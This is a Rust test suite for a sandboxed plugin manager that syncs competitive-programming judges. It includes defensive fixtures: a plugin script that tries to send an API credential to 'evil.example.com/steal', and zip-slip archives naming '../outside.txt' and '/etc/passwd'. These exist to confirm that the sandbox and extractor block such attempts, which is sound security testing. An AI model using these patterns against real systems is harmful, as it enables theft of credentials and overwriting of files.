use std::collections::BTreeMap;
use std::io::{Cursor, Write};
use std::sync::Arc;
use std::time::Duration;

use base64::Engine;

use crate::credentials::{CredentialStore, MemoryCredentialStore};
use crate::error::{PluginError, Result};
use crate::http::{HttpRequest, HttpResponse, MockHttpClient};
use crate::kv::KvStore;
use crate::manager::{
    PluginManager, PluginOrigin, RepoCatalog, RepoPluginEntry, ScaffoldKind, extract_zip_safe,
    init_plugin_scaffold, sha256_hex, test_plugin_dir,
};
use crate::manifest::{
    CommandContext, PluginCapability, PluginManifest, PluginPermissions, is_domain_allowed,
};
use crate::oj::{OjContext, OjPluginClient};
use crate::runtime::{HostContext, PluginRuntime, SandboxLimits};
use crate::workspace::{WorkspaceProblemDetail, WorkspaceProblemSummary, WorkspaceReader};

fn make_zip(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = Cursor::new(Vec::new());
    {
        let mut writer = zip::ZipWriter::new(&mut buf);
        let opts = zip::write::SimpleFileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);
        for (name, content) in files {
            writer.start_file(*name, opts).unwrap();
            writer.write_all(content).unwrap();
        }
        writer.finish().unwrap();
    }
    buf.into_inner()
}

fn minimal_manifest(id: &str, domains: &[&str], workspace_read: bool) -> PluginManifest {
    PluginManifest {
        id: id.to_string(),
        name: format!("Test {id}"),
        version: "0.1.0".to_string(),
        description: String::new(),
        author: None,
        homepage: None,
        entry: "index.js".to_string(),
        ui_entry: None,
        capabilities: vec![PluginCapability::OjSource],
        permissions: PluginPermissions {
            domains: domains.iter().map(|s| s.to_string()).collect(),
            workspace_read,
            workspace_write: false,
        },
        credentials: Vec::new(),
        tools: Vec::new(),
        commands: Vec::new(),
        importers: Vec::new(),
        exporters: Vec::new(),
        templates: Vec::new(),
        font_dirs: Vec::new(),
    }
}

fn ok_json(body: &str) -> Result<HttpResponse> {
    Ok(HttpResponse {
        status: 200,
        headers: BTreeMap::from([("content-type".to_string(), "application/json".to_string())]),
        body: body.to_string(),
        body_base64: None,
    })
}

struct MockWorkspace {
    problems: Vec<WorkspaceProblemDetail>,
}

impl WorkspaceReader for MockWorkspace {
    fn list_problems(&self) -> Result<Vec<WorkspaceProblemSummary>> {
        Ok(self
            .problems
            .iter()
            .map(|p| WorkspaceProblemSummary {
                id: p.id.clone(),
                title: p.title.clone(),
                tags: p.tags.clone(),
                difficulty: p.difficulty.clone(),
                rating: p.rating,
                time_limit: p.time_limit.clone(),
                memory_limit: p.memory_limit.clone(),
                sample_count: p.samples.len(),
                has_editorial: p.editorial_md.is_some(),
            })
            .collect())
    }

    fn get_problem(&self, id: &str) -> Result<Option<WorkspaceProblemDetail>> {
        Ok(self.problems.iter().find(|p| p.id == id).cloned())
    }
}

#[test]
fn manifest_all_capabilities_and_permission_summary() {
    let toml_src = r#"
id = "full-featured"
name = "Full Featured Plugin"
version = "1.2.3"
description = "Tests all 5 capabilities and credentials"
entry = "index.js"
ui_entry = "ui.js"
capabilities = ["oj_source", "tool", "commands", "importer", "exporter", "credentials"]

[permissions]
domains = ["api.example.com", "*.sub.example.org"]
workspace_read = true

[[credentials]]
key = "api_token"
label = "API Token"
secret = true
required = true

[[tools]]
id = "calc"
name = "Calculator"

[[tools.inputs]]
name = "expr"
label = "Expression"
kind = "string"
required = true

[[commands]]
id = "open-calc"
title = "Open Calculator"
context = "problem"

[[importers]]
id = "fps"
name = "FPS XML"
extensions = [".xml"]

[[exporters]]
id = "domjudge"
name = "DOMjudge Package"
extension = ".zip"
"#;
    let m = PluginManifest::from_toml_str(toml_src).unwrap();
    assert_eq!(m.capabilities.len(), 6);
    assert!(m.has_capability(PluginCapability::OjSource));
    assert!(m.has_capability(PluginCapability::Tool));
    assert!(m.has_capability(PluginCapability::Commands));
    assert!(m.has_capability(PluginCapability::Importer));
    assert!(m.has_capability(PluginCapability::Exporter));
    assert!(m.has_capability(PluginCapability::Credentials));
    assert_eq!(m.commands[0].context, CommandContext::Problem);

    let summary = m.permission_summary();
    assert_eq!(summary.plugin_id, "full-featured");
    assert_eq!(
        summary.domains,
        vec!["api.example.com", "*.sub.example.org"]
    );
    assert_eq!(summary.credentials, vec!["api_token"]);
    assert!(summary.workspace_read);
    assert!(m.requires_trust());

    // Domain matching edge cases
    assert!(is_domain_allowed(&m.permissions.domains, "API.EXAMPLE.COM"));
    assert!(is_domain_allowed(
        &m.permissions.domains,
        "a.sub.example.org"
    ));
    assert!(!is_domain_allowed(
        &m.permissions.domains,
        "sub.example.org"
    ));
    assert!(!is_domain_allowed(
        &m.permissions.domains,
        "evil-example.com"
    ));

    // Reject path escape in entry
    let bad = r#"
id = "bad"
name = "Bad"
version = "1.0.0"
entry = "../escape.js"
"#;
    assert!(matches!(
        PluginManifest::from_toml_str(bad),
        Err(PluginError::ManifestInvalid(_))
    ));
}

#[test]
fn sandbox_enforces_timeout() {
    let manifest = minimal_manifest("looper", &[], false);
    let host_ctx = HostContext {
        manifest,
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits {
            timeout: Duration::from_millis(80),
            memory_limit_bytes: 16 * 1024 * 1024,
        },
    };
    let src = r#"
        module.exports = {
            spin() {
                while (true) {}
            }
        };
    "#;
    let err = PluginRuntime::call_function(src, "spin", &[], &host_ctx).unwrap_err();
    assert!(matches!(err, PluginError::Timeout { .. }), "got: {err:?}");
    assert_eq!(err.code(), "TIMEOUT");
}

#[test]
fn sandbox_enforces_memory_limit() {
    let manifest = minimal_manifest("oom", &[], false);
    let host_ctx = HostContext {
        manifest,
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits {
            timeout: Duration::from_secs(5),
            memory_limit_bytes: 2 * 1024 * 1024,
        },
    };
    let src = r#"
        module.exports = {
            blowUp() {
                const chunks = [];
                for (let i = 0; i < 1000; i++) {
                    chunks.push("x".repeat(1024 * 128));
                }
                return chunks.length;
            }
        };
    "#;
    let err = PluginRuntime::call_function(src, "blowUp", &[], &host_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::MemoryLimit { .. }),
        "expected MemoryLimit, got: {err:?}"
    );
    assert_eq!(err.code(), "MEMORY_LIMIT");
}

#[test]
fn sandbox_domain_whitelist_blocks_unauthorized_host_and_protects_credentials() {
    let mock_http = Arc::new(MockHttpClient::new(|req: &HttpRequest| {
        ok_json(&serde_json::json!({ "seen_auth": req.headers.get("Authorization") }).to_string())
    }));
    let creds = Arc::new(MemoryCredentialStore::new());
    creds.set("scoped", "api_key", "super-secret").unwrap();

    let manifest = minimal_manifest("scoped", &["allowed.example.com"], false);
    let host_ctx = HostContext {
        manifest,
        http_client: mock_http.clone(),
        credentials: creds.clone(),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };

    let src = r#"
        module.exports = {
            callEvil() {
                return host.http.fetch({
                    url: "https://evil.example.com/steal",
                    credentialHeader: { header: "Authorization", key: "api_key", prefix: "Bearer " }
                });
            },
            callAllowed() {
                const res = host.http.fetch({
                    url: "https://allowed.example.com/data",
                    credentialHeader: { header: "Authorization", key: "api_key", prefix: "Bearer " }
                });
                return {
                    body: JSON.parse(res.body),
                    cred: host.credentials.get("api_key"),
                    hasFs: typeof fs !== "undefined",
                    hasProcess: typeof process !== "undefined",
                };
            }
        };
    "#;

    // Unauthorized domain must fail with DOMAIN_NOT_ALLOWED and never hit network
    let err = PluginRuntime::call_function(src, "callEvil", &[], &host_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::DomainNotAllowed { ref host, .. } if host == "evil.example.com"),
        "got: {err:?}"
    );
    assert_eq!(err.code(), "DOMAIN_NOT_ALLOWED");
    assert!(mock_http.recorded_requests().is_empty());

    // Whitelisted domain succeeds and receives credential header
    let ok = PluginRuntime::call_function(src, "callAllowed", &[], &host_ctx).unwrap();
    assert_eq!(ok.value["body"]["seen_auth"], "Bearer super-secret");
    assert_eq!(ok.value["cred"], "super-secret");
    assert_eq!(ok.value["hasFs"], false);
    assert_eq!(ok.value["hasProcess"], false);
}

#[test]
fn sandbox_workspace_read_gating() {
    let ws = Arc::new(MockWorkspace {
        problems: vec![WorkspaceProblemDetail {
            id: "cf-1999a".into(),
            title: "A+B Again?".into(),
            tags: vec!["math".into()],
            difficulty: Some("800".into()),
            rating: Some(800),
            time_limit: None,
            memory_limit: None,
            source: Vec::new(),
            samples: Vec::new(),
            statement_md: Some("Compute sum of digits.".into()),
            editorial_md: None,
        }],
    });
    let src = r#"
        module.exports = {
            readAll() {
                const list = host.workspace.listProblems();
                const detail = host.workspace.getProblem("cf-1999a");
                return { list, detail };
            }
        };
    "#;

    // Denied when manifest.permissions.workspace_read == false
    let denied_ctx = HostContext {
        manifest: minimal_manifest("no-ws", &[], false),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: Some(ws.clone()),
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let err = PluginRuntime::call_function(src, "readAll", &[], &denied_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::PermissionDenied { .. }),
        "got: {err:?}"
    );
    assert_eq!(err.code(), "PERMISSION_DENIED");

    // Allowed when manifest.permissions.workspace_read == true
    let allowed_ctx = HostContext {
        manifest: minimal_manifest("with-ws", &[], true),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: Some(ws),
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let ok = PluginRuntime::call_function(src, "readAll", &[], &allowed_ctx).unwrap();
    assert_eq!(ok.value["list"].as_array().unwrap().len(), 1);
    assert_eq!(ok.value["detail"]["title"], "A+B Again?");
}

#[test]
fn host_kv_render_html_log_and_async_promise() {
    let dir = tempfile::tempdir().unwrap();
    let kv = Arc::new(KvStore::open(dir.path(), "demo").unwrap());
    let host_ctx = HostContext {
        manifest: minimal_manifest("demo", &[], false),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: kv.clone(),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };

    let src = r##"
        module.exports = {
            async run() {
                host.log("info", "starting");
                host.kv.set("cursor", 42);
                const c = host.kv.get("cursor");
                const nodes = host.html.select("<div><a href='/p/1'>Hello</a></div>", "a");
                const pngB64 = host.render.svgToPng(
                    '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"><rect width="16" height="16" fill="#000"/></svg>',
                    1
                );
                return { cursor: c, linkText: nodes[0].text, linkHref: nodes[0].attrs.href, pngB64 };
            }
        };
    "##;

    let res = PluginRuntime::call_function(src, "run", &[], &host_ctx).unwrap();
    assert_eq!(res.value["cursor"], 42);
    assert_eq!(res.value["linkText"], "Hello");
    assert_eq!(res.value["linkHref"], "/p/1");
    assert_eq!(res.logs.len(), 1);
    assert_eq!(res.logs[0].level, "info");
    assert_eq!(res.logs[0].message, "starting");

    let png_bytes = base64::engine::general_purpose::STANDARD
        .decode(res.value["pngB64"].as_str().unwrap())
        .unwrap();
    assert_eq!(&png_bytes[..8], b"\x89PNG\r\n\x1a\n");

    // Verify atomic persistence on disk
    let reopened = KvStore::open(dir.path(), "demo").unwrap();
    assert_eq!(reopened.get("cursor").unwrap(), Some(serde_json::json!(42)));
}

#[test]
fn zip_slip_attack_is_rejected() {
    let tmp = tempfile::tempdir().unwrap();
    let malicious_zip = make_zip(&[("../outside.txt", b"pwned")]);
    let err = extract_zip_safe(&malicious_zip, tmp.path()).unwrap_err();
    assert!(matches!(err, PluginError::ZipSlip(_)), "got: {err:?}");
    assert_eq!(err.code(), "ZIP_SLIP");

    let abs_zip = make_zip(&[("/etc/passwd", b"nope")]);
    let err2 = extract_zip_safe(&abs_zip, tmp.path()).unwrap_err();
    assert!(matches!(err2, PluginError::ZipSlip(_)), "got: {err2:?}");

    let backslash_zip = make_zip(&[(r"..\..\evil.js", b"nope")]);
    let err3 = extract_zip_safe(&backslash_zip, tmp.path()).unwrap_err();
    assert!(matches!(err3, PluginError::ZipSlip(_)), "got: {err3:?}");
}

#[test]
fn builtin_codeforces_end_to_end() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let loaded = mgr.load_plugin("codeforces").unwrap();
    assert_eq!(loaded.info.origin, PluginOrigin::Builtin);

    let mock_http = Arc::new(MockHttpClient::new(|req: &HttpRequest| {
        if req.url.contains("/api/user.info") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [{
                        "handle": "tourist",
                        "rating": 3800,
                        "maxRating": 4009,
                        "rank": "legendary grandmaster"
                    }]
                }"#,
            )
        } else if req.url.contains("/api/user.rating") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [{
                        "contestId": 1999,
                        "contestName": "Codeforces Round 964 (Div. 4)",
                        "rank": 1,
                        "oldRating": 3750,
                        "newRating": 3800,
                        "ratingUpdateTimeSeconds": 1722960000
                    }]
                }"#,
            )
        } else if req.url.contains("/api/user.status") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [
                        {
                            "id": 2002,
                            "creationTimeSeconds": 1722961200,
                            "programmingLanguage": "C++20 (GCC 13-64)",
                            "verdict": "OK",
                            "problem": {
                                "contestId": 1999,
                                "index": "A",
                                "name": "A+B Again?",
                                "rating": 800,
                                "tags": ["implementation", "math"]
                            }
                        },
                        {
                            "id": 2001,
                            "creationTimeSeconds": 1722961000,
                            "programmingLanguage": "C++20 (GCC 13-64)",
                            "verdict": "WRONG_ANSWER",
                            "problem": {
                                "contestId": 1999,
                                "index": "B",
                                "name": "Card Game",
                                "rating": 1000,
                                "tags": ["games"]
                            }
                        }
                    ]
                }"#,
            )
        } else if req.url.contains("/api/contest.list") {
            ok_json(
                r#"{
                    "status": "OK",
                    "result": [
                        {
                            "id": 2050,
                            "name": "Codeforces Round 990",
                            "type": "CF",
                            "phase": "BEFORE",
                            "durationSeconds": 7200,
                            "startTimeSeconds": 1735000000
                        },
                        {
                            "id": 1900,
                            "name": "Old Round",
                            "type": "CF",
                            "phase": "FINISHED",
                            "durationSeconds": 7200,
                            "startTimeSeconds": 1700000000
                        }
                    ]
                }"#,
            )
        } else {
            panic!("unexpected url: {}", req.url);
        }
    }));

    let host_ctx = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let client = OjPluginClient::new(&loaded.entry_source, &host_ctx);
    let oj_ctx = OjContext {
        handle: "tourist".into(),
    };

    let v = client.verify(&oj_ctx).unwrap();
    assert!(v.ok);
    assert_eq!(v.handle.as_deref(), Some("tourist"));

    let acct = client.sync_account(&oj_ctx).unwrap();
    assert_eq!(acct.rating, Some(3800));
    assert_eq!(acct.max_rating, Some(4009));
    assert_eq!(acct.rating_history.len(), 1);
    assert_eq!(acct.rating_history[0].contest_id, "1999");

    // Initial submission sync
    let batch1 = client.sync_submissions(&oj_ctx, None).unwrap();
    assert_eq!(batch1.submissions.len(), 2);
    assert_eq!(batch1.submissions[0].verdict, "AC");
    assert_eq!(batch1.submissions[0].problem_key, "1999A");
    assert_eq!(batch1.submissions[1].verdict, "WA");
    assert_eq!(batch1.next_cursor.as_deref(), Some("2002"));

    // Incremental sync with cursor "2001" only returns submission 2002
    let batch2 = client.sync_submissions(&oj_ctx, Some("2001")).unwrap();
    assert_eq!(batch2.submissions.len(), 1);
    assert_eq!(batch2.submissions[0].submission_id, "2002");

    let contests = client.fetch_contests(&oj_ctx).unwrap();
    assert_eq!(contests.len(), 1);
    assert_eq!(contests[0].contest_id, "2050");

    assert_eq!(client.normalize_rating(1650.0).unwrap(), Some(1650));

    let p1 = client
        .parse_problem_url("https://codeforces.com/problemset/problem/1999/A")
        .unwrap()
        .unwrap();
    assert_eq!(p1.problem_id, "1999A");
    let p2 = client
        .parse_problem_url("https://codeforces.com/contest/1999/problem/B")
        .unwrap()
        .unwrap();
    assert_eq!(p2.problem_id, "1999B");
    let p3 = client
        .parse_problem_url("https://codeforces.com/gym/100001/problem/C")
        .unwrap()
        .unwrap();
    assert_eq!(p3.problem_id, "100001C");
    assert!(
        client
            .parse_problem_url("https://atcoder.jp/contests/abc350/tasks/abc350_a")
            .unwrap()
            .is_none()
    );
}

#[test]
fn builtin_atcoder_end_to_end() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let loaded = mgr.load_plugin("atcoder").unwrap();
    assert_eq!(loaded.info.origin, PluginOrigin::Builtin);

    let mock_http = Arc::new(MockHttpClient::new(|req: &HttpRequest| {
        if req.url.contains("atcoder.jp/users/chokudai/history/json") {
            ok_json(
                r#"[
                    {
                        "IsRated": true,
                        "Place": 10,
                        "OldRating": 2700,
                        "NewRating": 2850,
                        "ContestName": "AtCoder Beginner Contest 350",
                        "ContestScreenName": "abc350.contest.atcoder.jp",
                        "EndTime": "2024-04-20T22:40:00+09:00",
                        "ContestType": 0
                    },
                    {
                        "IsRated": true,
                        "Place": 1,
                        "OldRating": 2000,
                        "NewRating": 2200,
                        "ContestName": "AtCoder Heuristic Contest 032",
                        "ContestScreenName": "ahc032.contest.atcoder.jp",
                        "EndTime": "2024-04-21T22:40:00+09:00",
                        "ContestType": 1
                    }
                ]"#,
            )
        } else if req
            .url
            .contains("kenkoooo.com/atcoder/atcoder-api/v3/user/submissions")
        {
            ok_json(
                r#"[
                    {
                        "id": 50001,
                        "epoch_second": 1713615000,
                        "problem_id": "abc350_d",
                        "contest_id": "abc350",
                        "user_id": "chokudai",
                        "language": "C++ 20 (gcc 12.2)",
                        "result": "AC"
                    }
                ]"#,
            )
        } else if req
            .url
            .contains("kenkoooo.com/atcoder/resources/problems.json")
        {
            ok_json(
                r#"[
                    {
                        "id": "abc350_d",
                        "contest_id": "abc350",
                        "problem_index": "D",
                        "name": "New Friends",
                        "title": "D. New Friends"
                    }
                ]"#,
            )
        } else if req
            .url
            .contains("kenkoooo.com/atcoder/resources/problem-models.json")
        {
            ok_json(r#"{ "abc350_d": { "difficulty": 1200 } }"#)
        } else if req.url == "https://atcoder.jp/contests/" {
            Ok(HttpResponse {
                status: 200,
                headers: BTreeMap::new(),
                body: r##"
                    <html><body>
                      <div id="contest-table-upcoming">
                        <table><tbody>
                          <tr>
                            <td><a href="#">2026-12-01 21:00:00+0900</a></td>
                            <td><a href="/contests/abc400">AtCoder Beginner Contest 400</a></td>
                            <td>01:40</td>
                          </tr>
                        </tbody></table>
                      </div>
                    </body></html>
                "##
                .to_string(),
                body_base64: None,
            })
        } else {
            panic!("unexpected url: {}", req.url);
        }
    }));

    let host_ctx = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let client = OjPluginClient::new(&loaded.entry_source, &host_ctx);
    let oj_ctx = OjContext {
        handle: "chokudai".into(),
    };

    assert!(client.verify(&oj_ctx).unwrap().ok);

    // Heuristic contest (ContestType == 1 / ahc032) must be excluded!
    let acct = client.sync_account(&oj_ctx).unwrap();
    assert_eq!(acct.rating, Some(2850));
    assert_eq!(acct.max_rating, Some(2850));
    assert_eq!(acct.rank.as_deref(), Some("red"));
    assert_eq!(acct.rating_history.len(), 1);
    assert_eq!(acct.rating_history[0].contest_id, "abc350");

    let batch = client.sync_submissions(&oj_ctx, None).unwrap();
    assert_eq!(batch.submissions.len(), 1);
    assert_eq!(batch.submissions[0].problem_key, "abc350_d");
    assert_eq!(batch.submissions[0].problem_title, "D. New Friends");
    assert_eq!(batch.submissions[0].raw_rating, Some(1200.0));
    assert_eq!(batch.submissions[0].normalized_rating, Some(1760));
    assert_eq!(batch.next_cursor.as_deref(), Some("1713615000"));

    let contests = client.fetch_contests(&oj_ctx).unwrap();
    assert_eq!(contests.len(), 1);
    assert_eq!(contests[0].contest_id, "abc400");
    assert_eq!(contests[0].duration_sec, 6000);

    let r_low = client.normalize_rating(0.0).unwrap().unwrap();
    let r_mid = client.normalize_rating(1200.0).unwrap().unwrap();
    let r_high = client.normalize_rating(2400.0).unwrap().unwrap();
    assert!(r_low < r_mid && r_mid < r_high);

    let parsed = client
        .parse_problem_url("https://atcoder.jp/contests/abc350/tasks/abc350_d")
        .unwrap()
        .unwrap();
    assert_eq!(parsed.platform, "atcoder");
    assert_eq!(parsed.contest_id.as_deref(), Some("abc350"));
    assert_eq!(parsed.problem_id, "abc350_d");
    assert_eq!(parsed.problem_index.as_deref(), Some("D"));
}

#[test]
fn lightweight_oj_plugin_sync_summary() {
    let manifest = minimal_manifest("luogu-lite", &["www.luogu.com.cn"], false);
    let mock_http = Arc::new(MockHttpClient::new(|_req| {
        ok_json(r#"{ "passed": 321, "submitted": 654, "problems": ["P1001", "P1002"] }"#)
    }));
    let host_ctx = HostContext {
        manifest,
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let src = r#"
        module.exports = {
            syncSummary(ctx) {
                const r = host.http.fetch({ url: "https://www.luogu.com.cn/user/" + ctx.handle });
                const d = JSON.parse(r.body);
                return {
                    handle: ctx.handle,
                    solved_count: d.passed,
                    submission_count: d.submitted,
                    solved_problem_keys: d.problems,
                };
            }
        };
    "#;
    let client = OjPluginClient::new(src, &host_ctx);
    let summary = client
        .sync_summary(&OjContext {
            handle: "12345".into(),
        })
        .unwrap();
    assert_eq!(summary.solved_count, 321);
    assert_eq!(summary.submission_count, Some(654));
    assert_eq!(summary.solved_problem_keys, vec!["P1001", "P1002"]);
}

#[test]
fn manager_builtin_override_state_and_repo_sha256() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    // Export built-in copy -> becomes LocalOverride
    let exported = mgr.export_builtin_copy("codeforces").unwrap();
    assert!(exported.join("manifest.toml").is_file());
    let list = mgr.list_plugins().unwrap();
    let cf = list.iter().find(|p| p.manifest.id == "codeforces").unwrap();
    assert_eq!(cf.origin, PluginOrigin::LocalOverride);

    // Disable & record error persist across reads
    mgr.set_enabled("codeforces", false).unwrap();
    mgr.record_error("codeforces", "rate limited").unwrap();
    let cf2 = mgr
        .list_plugins()
        .unwrap()
        .into_iter()
        .find(|p| p.manifest.id == "codeforces")
        .unwrap();
    assert!(!cf2.enabled);
    assert_eq!(cf2.last_error.as_deref(), Some("rate limited"));
    mgr.clear_error("codeforces").unwrap();

    // Build a valid community plugin ZIP inside a top-level folder
    let community_zip = make_zip(&[
        (
            "vjudge-plugin/manifest.toml",
            br#"
id = "vjudge"
name = "VJudge"
version = "0.2.0"
entry = "index.js"
capabilities = ["oj_source"]
"#,
        ),
        (
            "vjudge-plugin/index.js",
            b"module.exports = { verify(ctx) { return { ok: true, handle: ctx.handle }; } };",
        ),
    ]);
    let good_sha = sha256_hex(&community_zip);
    let catalog = RepoCatalog {
        name: "Community Repo".into(),
        plugins: vec![RepoPluginEntry {
            id: "vjudge".into(),
            name: "VJudge".into(),
            version: "0.2.0".into(),
            description: "VJudge plugin".into(),
            download_url: "https://repo.example.com/vjudge.zip".into(),
            sha256: good_sha.clone(),
            capabilities: vec![],
            has_ui: false,
            official: false,
            permissions: None,
        }],
    };
    let catalog_json = serde_json::to_string(&catalog).unwrap();
    let zip_clone = community_zip.clone();
    let mock_http = MockHttpClient::new(move |req| {
        if req.url == "https://repo.example.com/index.json" {
            ok_json(&catalog_json)
        } else {
            panic!("unexpected url {}", req.url);
        }
    })
    .with_bytes_handler(move |url| {
        if url == "https://repo.example.com/vjudge.zip" {
            Ok(zip_clone.clone())
        } else {
            panic!("unexpected download url {url}");
        }
    });

    // Default official repo is pre-populated when `plugin_repos.json` does not exist yet.
    assert_eq!(mgr.list_repos().unwrap().len(), 1);
    mgr.add_repo(
        "https://repo.example.com/index.json",
        Some("Community".into()),
    )
    .unwrap();
    assert_eq!(mgr.list_repos().unwrap().len(), 2);

    let fetched = mgr
        .fetch_repo_catalog("https://repo.example.com/index.json", &mock_http)
        .unwrap();
    assert_eq!(fetched.plugins.len(), 1);

    // Mismatched SHA-256 must be rejected
    let mut bad_entry = fetched.plugins[0].clone();
    bad_entry.sha256 = "0".repeat(64);
    let err = mgr
        .install_from_repo_entry(&bad_entry, &mock_http)
        .unwrap_err();
    assert!(
        matches!(err, PluginError::ChecksumMismatch { .. }),
        "got: {err:?}"
    );
    assert_eq!(err.code(), "CHECKSUM_MISMATCH");

    // Matching SHA-256 installs cleanly
    let installed = mgr
        .install_from_repo_entry(&fetched.plugins[0], &mock_http)
        .unwrap();
    assert_eq!(installed.manifest.id, "vjudge");
    assert_eq!(installed.origin, PluginOrigin::Local);

    assert!(
        mgr.remove_repo("https://repo.example.com/index.json")
            .unwrap()
    );
    assert_eq!(mgr.list_repos().unwrap().len(), 1);
}

#[test]
fn scaffold_and_test_plugin_dir() {
    let tmp = tempfile::tempdir().unwrap();
    let tool_dir = tmp.path().join("my-tool");
    init_plugin_scaffold(&tool_dir, ScaffoldKind::Tool).unwrap();
    assert!(tool_dir.join("manifest.toml").is_file());
    assert!(tool_dir.join("index.js").is_file());
    assert!(!tool_dir.join("xcpc-plugin.d.ts").exists());
    let manifest = PluginManifest::from_file(&tool_dir.join("manifest.toml")).unwrap();
    assert_eq!(manifest.name, "My Tool");

    let report = test_plugin_dir(
        &tool_dir,
        "runTool",
        r#"["hello", { "text": "XCPC" }]"#,
        Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        Arc::new(MemoryCredentialStore::new()),
        None,
    )
    .unwrap();
    assert_eq!(report.plugin_id, "my-tool");
    assert_eq!(report.action, "runTool");
    assert_eq!(report.result["blocks"][0]["content"], "Hello, XCPC!");

    let oj_dir = tmp.path().join("my-oj");
    init_plugin_scaffold(&oj_dir, ScaffoldKind::Oj).unwrap();
    let oj_report = test_plugin_dir(
        &oj_dir,
        "verify",
        r#"[{ "handle": "alice" }]"#,
        Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        Arc::new(MemoryCredentialStore::new()),
        None,
    )
    .unwrap();
    assert_eq!(oj_report.result["ok"], true);
    assert_eq!(oj_report.result["handle"], "alice");
}

#[test]
fn render_svg_to_rgba_and_highlight_code_primitives() {
    use crate::render::{highlight_code, svg_to_rgba};

    let svg = r##"<svg xmlns="http://www.w3.org/2000/svg" width="24" height="12"><rect width="24" height="12" fill="#2563eb"/></svg>"##;
    let rgba = svg_to_rgba(svg, 2.0).unwrap();
    assert_eq!(rgba.width, 48);
    assert_eq!(rgba.height, 24);
    let raw = base64::engine::general_purpose::STANDARD
        .decode(&rgba.rgba_base64)
        .unwrap();
    assert_eq!(raw.len(), (48 * 24 * 4) as usize);

    // Highlight C++ code and verify token kinds & lossless text reconstruction
    let cpp = "#include <iostream>\nint main() {\n  // hello\n  const int x = 42;\n  return x;\n}";
    let hl = highlight_code(cpp, "cpp");
    assert_eq!(hl.language, "cpp");
    assert_eq!(hl.lines.len(), 6);
    for (orig, line) in cpp.lines().zip(&hl.lines) {
        let joined: String = line.tokens.iter().map(|t| t.text.as_str()).collect();
        assert_eq!(joined, orig);
    }
    assert!(
        hl.lines[0]
            .tokens
            .iter()
            .any(|t| t.kind == "keyword" && t.text == "#include")
    );
    assert!(
        hl.lines[1]
            .tokens
            .iter()
            .any(|t| t.kind == "type" && t.text == "int")
    );
    assert!(hl.lines[2].tokens.iter().any(|t| t.kind == "comment"));
    assert!(
        hl.lines[3]
            .tokens
            .iter()
            .any(|t| t.kind == "number" && t.text == "42")
    );

    // Verify QuickJS bridge exposes host.render.svgToRgba & host.highlight
    let host_ctx = HostContext {
        manifest: minimal_manifest("hl-test", &[], false),
        http_client: Arc::new(MockHttpClient::new(|_| ok_json("{}"))),
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let src = r##"
        module.exports = {
            check() {
                const rgba = host.render.svgToRgba(
                    '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="#10b981"/></svg>',
                    1
                );
                const hl = host.highlight('fn main() { let s = "hi"; }', "rust");
                return { width: rgba.width, height: rgba.height, hasB64: rgba.rgba_base64.length > 0, lang: hl.language, tokens: hl.lines[0].tokens };
            }
        };
    "##;
    let call = PluginRuntime::call_function(src, "check", &[], &host_ctx).unwrap();
    assert_eq!(call.value["width"], 10);
    assert_eq!(call.value["height"], 10);
    assert_eq!(call.value["hasB64"], true);
    assert_eq!(call.value["lang"], "rust");
    let tokens = call.value["tokens"].as_array().unwrap();
    assert!(
        tokens
            .iter()
            .any(|t| t["kind"] == "keyword" && t["text"] == "fn")
    );
    assert!(
        tokens
            .iter()
            .any(|t| t["kind"] == "string" && t["text"] == "\"hi\"")
    );
}

#[test]
fn builtin_plugins_restricted_to_oj_and_local_ui_tool_works() {
    use crate::commands::PluginCommandAction;
    use crate::tool::ToolOutputBlock;

    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

